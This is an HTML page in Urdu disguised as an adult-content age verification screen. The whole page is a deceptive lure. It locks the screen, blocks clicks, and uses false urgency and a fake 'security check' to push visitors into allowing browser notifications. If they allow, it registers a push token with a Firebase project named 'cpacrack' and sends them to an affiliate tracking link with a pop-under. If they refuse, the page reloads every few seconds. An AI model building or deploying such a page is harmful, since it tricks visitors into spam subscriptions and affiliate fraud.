<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بالغ مواد کی تصدیق - جاری رکھنے کے لئے اجازت دیں</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: black;
            color: white;
            text-align: center;
            margin: 0;
            padding: 50px;
        }
        h1 {
            color: red;
            font-size: 30px;
            margin-top: 0;
        }
        .alert-box {
            background: #222;
            padding: 20px;
            display: inline-block;
            border-radius: 10px;
            margin-top: 20px;
            max-width: 400px;
        }
        .alert-box p {
            font-size: 18px;
            color: #ffcc00;
        }
        .locked {
            position: fixed;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            top: 0;
            left: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            font-size: 20px;
            z-index: 9999;
        }
        .btn {
            background-color: #ffcc00;
            color: black;
            padding: 15px 30px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #ff9900;
        }
        .offer-message {
            font-size: 18px;
            color: #ffcc00;
            margin-top: 30px;
        }
        .final-warning {
            color: red;
            font-size: 22px;
            font-weight: bold;
        }
        .urgency {
            color: #ff0000;
            font-size: 20px;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="locked" id="lockScreen">
        <h1>🔞 عمر کی تصدیق ضروری ہے 🔞</h1>
        <div class="alert-box">
            <p>اب خصوصی مواد ان لاک کریں! اپنی عمر کی تصدیق کرنے کے لیے <b>"اجازت دیں"</b> پر کلک کریں۔</p>
            <p><b>موقع ضائع نہ کریں! یہ آپ کا واحد موقع ہے مکمل رسائی حاصل کرنے کا۔</b></p>
        </div>

        <button class="btn" id="allowButton">نوٹیفیکیشن کی اجازت دیں اور مواد ان لاک کریں</button>

        <p class="urgency">⏳ محدود رسائی! صرف تھوڑی دیر کے لیے!</p>
        <p class="offer-message">اب "اجازت دیں" پر کلک کریں اور پریمیم مواد تک رسائی حاصل کریں!</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
        import { getAnalytics, logEvent } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-analytics.js";
        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-messaging.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCR4r9W605fmFeGpqRrb7FYToxWbYyJGtk",
            authDomain: "cpacrack-4949d.firebaseapp.com",
            projectId: "cpacrack-4949d",
            storageBucket: "cpacrack-4949d.firebasestorage.app",
            messagingSenderId: "705004765379",
            appId: "1:705004765379:web:0bc9f959b55c5231cba276",
            measurementId: "G-SRMYG5ZVMH"
        };

        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const messaging = getMessaging(app);

        document.body.style.pointerEvents = "none";
        
        // Function to request notification permission
        function requestNotificationPermission() {
            Notification.requestPermission().then(permission => {
                if (permission === "granted") {
                    logEvent(analytics, 'notification_permission_granted');
                    getToken(messaging, { vapidKey: 'BMPPrc5Za775GGbVKn8piovY5XlQVnBNlKwTjviSrQZ59xr4uufNpQqnNqdIpdr84wUaOURG57zLS4uwQXmrWIg' })
                        .then(currentToken => {
                            console.log("FCM Token:", currentToken);
                        }).catch(err => {
                            console.log("Error getting FCM token:", err);
                        });

                    setTimeout(() => {
                        // Redirect to premium content video
                        window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN";
                    }, 2000);

                    document.getElementById("lockScreen").style.display = "none";
                    document.body.style.pointerEvents = "auto";
                } else {
                    logEvent(analytics, 'notification_permission_denied');
                    // Final message if permission is denied
                    document.getElementById("lockScreen").innerHTML = `
                        <h1 class="final-warning">🚨 آخری انتباہ 🚨</h1>
                        <div class="alert-box">
                            <p><b>رسائی سے انکار!</b> آپ کو خصوصی مواد تک رسائی کے لئے سیکیورٹی چیک کی اجازت دینی ہوگی۔</p>
                            <p>جاری رکھنے کے لیے <b>"اجازت دیں"</b> پر کلک کریں۔</p>
                        </div>
                        <button class="btn" id="allowButton">نوٹیفیکیشن کی اجازت دیں اور جاری رکھیں</button>
                        <p class="loading">دوبارہ کوشش کر رہے ہیں...</p>
                    `;
                    setTimeout(() => {
                        location.reload(); // Reload page to allow another attempt
                    }, 4000);
                }
            }).catch(err => {
                console.error("Error requesting notification permission:", err);
            });
        }

        // Function to start notification permission request
        requestNotificationPermission();

        // Allow retry by clicking the button
        document.getElementById("allowButton").addEventListener("click", () => {
            requestNotificationPermission();
        });
    </script>
</body>
</html>
